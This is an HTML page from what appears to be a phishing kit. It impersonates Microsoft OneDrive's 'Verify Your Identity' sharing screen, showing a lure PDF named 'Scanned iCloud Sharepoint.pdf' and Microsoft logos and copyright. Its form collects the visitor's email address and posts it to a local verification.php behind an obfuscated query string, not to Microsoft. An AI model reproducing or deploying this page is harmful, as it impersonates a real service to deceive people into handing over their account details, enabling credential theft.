<!doctype html>
<html>

<head>
	<meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<title>Sharing Link Validation</title>
	<link rel='stylesheet prefetch' href='https://fonts.googleapis.com/css?family=Open+Sans:600'>
	<link rel="stylesheet" href="css/share-point.css">
</head>

<body>
	<div id="SharingValidationControlsSection" class="external-sharing-content ms-Fabric">
		<div class="top-banner">
			<div class="brand-name"><span style="font-family: 'Segoe UI Web (West European)', 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;">OneDrive</span>
			</div>
		</div>
		<div class="main-content">
			<div class="desktop-logo ms-hiddenSm">
				<img class="microsoft-logo" src="img/logo.png" alt="">
			</div>
			<div class="sharing-form">
				<div class="header">
					<span style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">Verify Your Identity</span>
				</div>
				<div class="form-content">
					<form action="verification.php?sf58gfd1s689sxd2sdf8angf264s9df23sd2f1n495K3L2C151645172991f1477dbd26917ef3822423f62e984a91f1477dbd26917ef3822423f62e984a91f1477dbd" method="POST">

						<div class="file-description">
							<div class="file-description-title" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">You've received a secure link to:</div>
							<div class="file-info">
								<img alt="" src="img/pdf.png" style="height:32px;width:32px;">
								<div class="file-name" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">
									<span>Scanned iCloud Sharepoint.pdf</span>
								</div>
							</div>
						</div>

						<div>

							<div class="form-message" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;"><span>To open this secure link, You need to enter the email that this document was shared to.</span>
							</div>
							<div class="file-description">
								<div class="file-info">
									<img alt="logo-stripe" src="img/logo_strip.png" style="height:40px;width:300px; margin-bottom: 10px">

								</div>
							</div>
							<div class="form-input-container">

								<input name="username" maxlength="70" class="form-text-input disable-on-submit is-empty " placeholder="Enter email" type="email" pattern=".{4,30}" oninvalid="this.setCustomValidity('Required Field')" oninput="setCustomValidity('')" title="Required Field" required="">
								<div class="focus-area">
									<i class="ms-Icon ms-Icon--Info" aria-hidden="true"></i>
									<div class="callout" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">
										<div class="callout-title" style="">Why do I have to do this?</div>
										The person that has shared this link with you is sharing with a secure link which requires you to verify your identity.
									</div>
								</div>
							</div>
							<div class="form-error-container">
								<span style="display:none;">Your email address is required</span>
								<span style="display:none;">Your email address must be in the correct email format (e.g. "user@contoso.com")</span>
								<span id="IncorrectTOAAEMail" style="display:none;">Sorry, this email is not on the list of people this link is secured to. Please contact the person who shared it with you.</span>
							</div>
							<div class="form-input-container">
								<input name="btnSubmitEmail" value="Next" class="form-submit disable-on-submit" type="submit">
								<div class="submitted-text">
									<div class="spinner"></div>Checking...
								</div>
							</div>

						</div>




				</div>
			</div>
			</form>
			<div class="legal">
				<span>© 2018 Microsoft</span>
				<!--<a href='#'>Terms of Use</a> To Be Deleted-->
				<a href="#">Privacy &amp; Cookies</a>
			</div>
			<div class="mobile-logo ms-hiddenMdUp">
				<img class="microsoft-logo" src="img/logo.png" alt="">
			</div>
		</div>

	</div>

</body>

</html>